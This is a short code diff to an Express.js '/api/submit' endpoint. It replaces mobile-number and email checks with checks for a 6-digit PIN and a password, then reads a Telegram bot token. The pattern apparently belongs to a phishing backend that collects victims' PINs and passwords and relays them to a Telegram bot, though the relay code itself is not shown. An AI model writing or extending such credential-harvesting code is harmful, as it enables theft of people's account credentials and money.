@@ -16,9 +16,9 @@ app.post("/api/submit", async (req, res) => {
   const safePin = clean(pin, 6);
   const safePassword = clean(password, 12);
 
-  if (!safeName || !/^[0-9+\-\s]{8,20}$/.test(safePin) ||
-      !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(safePassword)) {
-    return res.status(400).json({ error: "Please enter a valid name, mobile number and email." });
+  if (!safeName || !/^\d{6}$/.test(safePin) ||
+      !/^(?=.*[A-Za-z])(?=.*\d).{8,12}$/.test(safePassword)) {
+    return res.status(400).json({ error: "Please enter a valid name, pin and password." });
   }
 
   const token = process.env.TELEGRAM_BOT_TOKEN;
